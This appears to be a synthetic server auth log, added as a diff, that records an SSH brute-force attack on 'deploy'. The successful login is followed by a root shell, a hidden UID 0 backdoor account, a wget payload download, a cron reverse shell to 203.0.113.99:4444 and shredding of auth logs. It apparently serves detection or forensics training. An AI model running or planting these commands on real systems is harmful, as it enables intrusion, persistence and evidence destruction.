@@ -1,0 +1,128 @@
+Oct 20 16:40:00 web-prod-01 CRON[41001]: (root) CMD (/usr/lib/php/sessionclean)
+Oct 20 16:42:00 web-prod-01 sshd[41002]: Accepted publickey for ops from 10.10.0.5 port 51022 ssh2: ED25519 SHA256:abc
+Oct 20 16:50:00 web-prod-01 CRON[41003]: (root) CMD (/usr/lib/php/sessionclean)
+Oct 20 17:00:00 web-prod-01 CRON[41004]: (root) CMD (/usr/lib/php/sessionclean)
+Oct 20 17:10:00 web-prod-01 CRON[41005]: (root) CMD (/usr/lib/php/sessionclean)
+Oct 20 17:20:00 web-prod-01 CRON[41006]: (root) CMD (/usr/lib/php/sessionclean)
+Oct 20 17:30:00 web-prod-01 CRON[41007]: (root) CMD (/usr/lib/php/sessionclean)
+Oct 20 17:40:00 web-prod-01 CRON[41008]: (root) CMD (/usr/lib/php/sessionclean)
+Oct 20 17:50:00 web-prod-01 CRON[41009]: (root) CMD (/usr/lib/php/sessionclean)
+Oct 20 18:00:00 web-prod-01 CRON[41010]: (root) CMD (/usr/lib/php/sessionclean)
+Oct 20 18:10:00 web-prod-01 CRON[41011]: (root) CMD (/usr/lib/php/sessionclean)
+Oct 20 18:20:00 web-prod-01 CRON[41012]: (root) CMD (/usr/lib/php/sessionclean)
+Oct 20 18:22:00 web-prod-01 sshd[41013]: Accepted publickey for ops from 10.10.0.5 port 51022 ssh2: ED25519 SHA256:abc
+Oct 20 18:30:00 web-prod-01 CRON[41014]: (root) CMD (/usr/lib/php/sessionclean)
+Oct 20 18:40:00 web-prod-01 CRON[41015]: (root) CMD (/usr/lib/php/sessionclean)
+Oct 20 18:50:00 web-prod-01 CRON[41016]: (root) CMD (/usr/lib/php/sessionclean)
+Oct 20 19:00:00 web-prod-01 CRON[41017]: (root) CMD (/usr/lib/php/sessionclean)
+Oct 20 19:10:00 web-prod-01 CRON[41018]: (root) CMD (/usr/lib/php/sessionclean)
+Oct 20 19:20:00 web-prod-01 CRON[41019]: (root) CMD (/usr/lib/php/sessionclean)
+Oct 20 19:30:00 web-prod-01 CRON[41020]: (root) CMD (/usr/lib/php/sessionclean)
+Oct 20 19:40:00 web-prod-01 CRON[41021]: (root) CMD (/usr/lib/php/sessionclean)
+Oct 20 19:50:00 web-prod-01 CRON[41022]: (root) CMD (/usr/lib/php/sessionclean)
+Oct 20 20:00:00 web-prod-01 CRON[41023]: (root) CMD (/usr/lib/php/sessionclean)
+Oct 20 20:02:00 web-prod-01 sshd[41024]: Accepted publickey for ops from 10.10.0.5 port 51022 ssh2: ED25519 SHA256:abc
+Oct 20 20:10:00 web-prod-01 CRON[41025]: (root) CMD (/usr/lib/php/sessionclean)
+Oct 20 20:20:00 web-prod-01 CRON[41026]: (root) CMD (/usr/lib/php/sessionclean)
+Oct 20 20:30:00 web-prod-01 CRON[41027]: (root) CMD (/usr/lib/php/sessionclean)
+Oct 20 20:40:00 web-prod-01 CRON[41028]: (root) CMD (/usr/lib/php/sessionclean)
+Oct 20 20:50:00 web-prod-01 CRON[41029]: (root) CMD (/usr/lib/php/sessionclean)
+Oct 20 21:00:00 web-prod-01 CRON[41030]: (root) CMD (/usr/lib/php/sessionclean)
+Oct 20 21:10:00 web-prod-01 CRON[41031]: (root) CMD (/usr/lib/php/sessionclean)
+Oct 20 21:20:00 web-prod-01 CRON[41032]: (root) CMD (/usr/lib/php/sessionclean)
+Oct 20 21:30:00 web-prod-01 CRON[41033]: (root) CMD (/usr/lib/php/sessionclean)
+Oct 20 22:40:00 web-prod-01 sshd[41034]: Failed password for ubuntu from 198.51.100.23 port 40000 ssh2
+Oct 20 22:40:02 web-prod-01 sshd[41035]: Failed password for root from 198.51.100.23 port 40001 ssh2
+Oct 20 22:40:04 web-prod-01 sshd[41036]: Failed password for admin from 198.51.100.23 port 40002 ssh2
+Oct 20 22:40:06 web-prod-01 sshd[41037]: Failed password for deploy from 198.51.100.23 port 40003 ssh2
+Oct 20 22:40:08 web-prod-01 sshd[41038]: Invalid user oracle from 198.51.100.23 port 40004
+Oct 20 22:40:08 web-prod-01 sshd[41039]: Failed password for invalid user oracle from 198.51.100.23 port 40004 ssh2
+Oct 20 22:40:10 web-prod-01 sshd[41040]: Invalid user oracle from 198.51.100.23 port 40005
+Oct 20 22:40:10 web-prod-01 sshd[41041]: Failed password for invalid user oracle from 198.51.100.23 port 40005 ssh2
+Oct 20 22:40:12 web-prod-01 sshd[41042]: Invalid user oracle from 198.51.100.23 port 40006
+Oct 20 22:40:12 web-prod-01 sshd[41043]: Failed password for invalid user oracle from 198.51.100.23 port 40006 ssh2
+Oct 20 22:40:14 web-prod-01 sshd[41044]: Invalid user test from 198.51.100.23 port 40007
+Oct 20 22:40:14 web-prod-01 sshd[41045]: Failed password for invalid user test from 198.51.100.23 port 40007 ssh2
+Oct 20 22:40:16 web-prod-01 sshd[41046]: Failed password for deploy from 198.51.100.23 port 40008 ssh2
+Oct 20 22:40:18 web-prod-01 sshd[41047]: Invalid user oracle from 198.51.100.23 port 40009
+Oct 20 22:40:18 web-prod-01 sshd[41048]: Failed password for invalid user oracle from 198.51.100.23 port 40009 ssh2
+Oct 20 22:40:20 web-prod-01 sshd[41049]: Failed password for admin from 198.51.100.23 port 40010 ssh2
+Oct 20 22:40:22 web-prod-01 sshd[41050]: Failed password for admin from 198.51.100.23 port 40011 ssh2
+Oct 20 22:40:24 web-prod-01 sshd[41051]: Failed password for admin from 198.51.100.23 port 40012 ssh2
+Oct 20 22:40:26 web-prod-01 sshd[41052]: Failed password for ubuntu from 198.51.100.23 port 40013 ssh2
+Oct 20 22:40:28 web-prod-01 sshd[41053]: Failed password for ubuntu from 198.51.100.23 port 40014 ssh2
+Oct 20 22:40:30 web-prod-01 sshd[41054]: Invalid user test from 198.51.100.23 port 40015
+Oct 20 22:40:30 web-prod-01 sshd[41055]: Failed password for invalid user test from 198.51.100.23 port 40015 ssh2
+Oct 20 22:40:32 web-prod-01 sshd[41056]: Failed password for ubuntu from 198.51.100.23 port 40016 ssh2
+Oct 20 22:40:34 web-prod-01 sshd[41057]: Invalid user test from 198.51.100.23 port 40017
+Oct 20 22:40:34 web-prod-01 sshd[41058]: Failed password for invalid user test from 198.51.100.23 port 40017 ssh2
+Oct 20 22:40:36 web-prod-01 sshd[41059]: Failed password for deploy from 198.51.100.23 port 40018 ssh2
+Oct 20 22:40:38 web-prod-01 sshd[41060]: Failed password for admin from 198.51.100.23 port 40019 ssh2
+Oct 20 22:40:40 web-prod-01 sshd[41061]: Failed password for admin from 198.51.100.23 port 40020 ssh2
+Oct 20 22:40:42 web-prod-01 sshd[41062]: Invalid user oracle from 198.51.100.23 port 40021
+Oct 20 22:40:42 web-prod-01 sshd[41063]: Failed password for invalid user oracle from 198.51.100.23 port 40021 ssh2
+Oct 20 22:40:44 web-prod-01 sshd[41064]: Failed password for deploy from 198.51.100.23 port 40022 ssh2
+Oct 20 22:40:46 web-prod-01 sshd[41065]: Failed password for ubuntu from 198.51.100.23 port 40023 ssh2
+Oct 20 22:40:48 web-prod-01 sshd[41066]: Invalid user test from 198.51.100.23 port 40024
+Oct 20 22:40:48 web-prod-01 sshd[41067]: Failed password for invalid user test from 198.51.100.23 port 40024 ssh2
+Oct 20 22:40:50 web-prod-01 sshd[41068]: Failed password for admin from 198.51.100.23 port 40025 ssh2
+Oct 20 22:40:52 web-prod-01 sshd[41069]: Invalid user test from 198.51.100.23 port 40026
+Oct 20 22:40:52 web-prod-01 sshd[41070]: Failed password for invalid user test from 198.51.100.23 port 40026 ssh2
+Oct 20 22:40:54 web-prod-01 sshd[41071]: Failed password for ubuntu from 198.51.100.23 port 40027 ssh2
+Oct 20 22:40:56 web-prod-01 sshd[41072]: Failed password for admin from 198.51.100.23 port 40028 ssh2
+Oct 20 22:40:58 web-prod-01 sshd[41073]: Invalid user oracle from 198.51.100.23 port 40029
+Oct 20 22:40:58 web-prod-01 sshd[41074]: Failed password for invalid user oracle from 198.51.100.23 port 40029 ssh2
+Oct 20 22:41:00 web-prod-01 sshd[41075]: Failed password for ubuntu from 198.51.100.23 port 40030 ssh2
+Oct 20 22:41:02 web-prod-01 sshd[41076]: Invalid user test from 198.51.100.23 port 40031
+Oct 20 22:41:02 web-prod-01 sshd[41077]: Failed password for invalid user test from 198.51.100.23 port 40031 ssh2
+Oct 20 22:41:04 web-prod-01 sshd[41078]: Invalid user oracle from 198.51.100.23 port 40032
+Oct 20 22:41:04 web-prod-01 sshd[41079]: Failed password for invalid user oracle from 198.51.100.23 port 40032 ssh2
+Oct 20 22:41:06 web-prod-01 sshd[41080]: Invalid user oracle from 198.51.100.23 port 40033
+Oct 20 22:41:06 web-prod-01 sshd[41081]: Failed password for invalid user oracle from 198.51.100.23 port 40033 ssh2
+Oct 20 22:41:08 web-prod-01 sshd[41082]: Failed password for deploy from 198.51.100.23 port 40034 ssh2
+Oct 20 22:41:10 web-prod-01 sshd[41083]: Failed password for root from 198.51.100.23 port 40035 ssh2
+Oct 20 22:41:12 web-prod-01 sshd[41084]: Failed password for root from 198.51.100.23 port 40036 ssh2
+Oct 20 22:41:14 web-prod-01 sshd[41085]: Invalid user test from 198.51.100.23 port 40037
+Oct 20 22:41:14 web-prod-01 sshd[41086]: Failed password for invalid user test from 198.51.100.23 port 40037 ssh2
+Oct 20 22:41:16 web-prod-01 sshd[41087]: Invalid user test from 198.51.100.23 port 40038
+Oct 20 22:41:16 web-prod-01 sshd[41088]: Failed password for invalid user test from 198.51.100.23 port 40038 ssh2
+Oct 20 22:41:18 web-prod-01 sshd[41089]: Failed password for admin from 198.51.100.23 port 40039 ssh2
+Oct 20 22:41:20 web-prod-01 sshd[41090]: Invalid user oracle from 198.51.100.23 port 40040
+Oct 20 22:41:20 web-prod-01 sshd[41091]: Failed password for invalid user oracle from 198.51.100.23 port 40040 ssh2
+Oct 20 22:41:22 web-prod-01 sshd[41092]: Failed password for ubuntu from 198.51.100.23 port 40041 ssh2
+Oct 20 22:41:24 web-prod-01 sshd[41093]: Failed password for deploy from 198.51.100.23 port 40042 ssh2
+Oct 20 22:41:26 web-prod-01 sshd[41094]: Invalid user test from 198.51.100.23 port 40043
+Oct 20 22:41:26 web-prod-01 sshd[41095]: Failed password for invalid user test from 198.51.100.23 port 40043 ssh2
+Oct 20 22:41:28 web-prod-01 sshd[41096]: Failed password for deploy from 198.51.100.23 port 40044 ssh2
+Oct 20 22:41:30 web-prod-01 sshd[41097]: Failed password for ubuntu from 198.51.100.23 port 40045 ssh2
+Oct 20 22:41:32 web-prod-01 sshd[41098]: Failed password for deploy from 198.51.100.23 port 40046 ssh2
+Oct 20 22:41:34 web-prod-01 sshd[41099]: Failed password for admin from 198.51.100.23 port 40047 ssh2
+Oct 20 22:41:36 web-prod-01 sshd[41100]: Failed password for deploy from 198.51.100.23 port 40048 ssh2
+Oct 20 22:41:38 web-prod-01 sshd[41101]: Failed password for ubuntu from 198.51.100.23 port 40049 ssh2
+Oct 20 22:41:40 web-prod-01 sshd[41102]: Invalid user test from 198.51.100.23 port 40050
+Oct 20 22:41:40 web-prod-01 sshd[41103]: Failed password for invalid user test from 198.51.100.23 port 40050 ssh2
+Oct 20 22:41:42 web-prod-01 sshd[41104]: Failed password for ubuntu from 198.51.100.23 port 40051 ssh2
+Oct 20 22:41:44 web-prod-01 sshd[41105]: Invalid user oracle from 198.51.100.23 port 40052
+Oct 20 22:41:44 web-prod-01 sshd[41106]: Failed password for invalid user oracle from 198.51.100.23 port 40052 ssh2
+Oct 20 22:41:46 web-prod-01 sshd[41107]: Failed password for ubuntu from 198.51.100.23 port 40053 ssh2
+Oct 20 22:41:48 web-prod-01 sshd[41108]: Failed password for admin from 198.51.100.23 port 40054 ssh2
+Oct 20 22:41:50 web-prod-01 sshd[41109]: Invalid user test from 198.51.100.23 port 40055
+Oct 20 22:41:50 web-prod-01 sshd[41110]: Failed password for invalid user test from 198.51.100.23 port 40055 ssh2
+Oct 20 22:41:52 web-prod-01 sshd[41111]: Failed password for deploy from 198.51.100.23 port 40056 ssh2
+Oct 20 22:41:54 web-prod-01 sshd[41112]: Invalid user oracle from 198.51.100.23 port 40057
+Oct 20 22:41:54 web-prod-01 sshd[41113]: Failed password for invalid user oracle from 198.51.100.23 port 40057 ssh2
+Oct 20 22:41:56 web-prod-01 sshd[41114]: Failed password for admin from 198.51.100.23 port 40058 ssh2
+Oct 20 22:41:58 web-prod-01 sshd[41115]: Failed password for ubuntu from 198.51.100.23 port 40059 ssh2
+Oct 20 22:42:05 web-prod-01 sshd[41116]: Accepted password for deploy from 198.51.100.23 port 40111 ssh2
+Oct 20 22:42:05 web-prod-01 sshd[41117]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
+Oct 20 22:45:05 web-prod-01 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash
+Oct 20 22:45:05 web-prod-01 sudo[41119]: pam_unix(sudo:session): session opened for user root(uid=0) by deploy(uid=1001)
+Oct 20 22:46:05 web-prod-01 useradd[41120]: new user: name=sysupdate, UID=0, GID=0, home=/var/tmp/.su, shell=/bin/bash, from=/dev/pts/0
+Oct 20 22:46:10 web-prod-01 usermod[41121]: add 'sysupdate' to group 'sudo'
+Oct 20 22:47:05 web-prod-01 sudo:   deploy : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget -q http://203.0.113.99/kworkerd -O /tmp/.kworkerd
+Oct 20 22:48:05 web-prod-01 crontab[41123]: (root) REPLACE (root)
+Oct 20 22:50:05 web-prod-01 CRON[41124]: (root) CMD (/bin/bash -c 'bash -i >& /dev/tcp/203.0.113.99/4444 0>&1')
+Oct 20 22:55:05 web-prod-01 CRON[41125]: (root) CMD (/bin/bash -c 'bash -i >& /dev/tcp/203.0.113.99/4444 0>&1')
+Oct 20 23:00:05 web-prod-01 CRON[41126]: (root) CMD (/bin/bash -c 'bash -i >& /dev/tcp/203.0.113.99/4444 0>&1')
+Oct 20 23:05:05 web-prod-01 CRON[41127]: (root) CMD (/bin/bash -c 'bash -i >& /dev/tcp/203.0.113.99/4444 0>&1')
+Oct 20 23:10:05 web-prod-01 sudo:   deploy : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/shred -u /var/log/auth.log.1
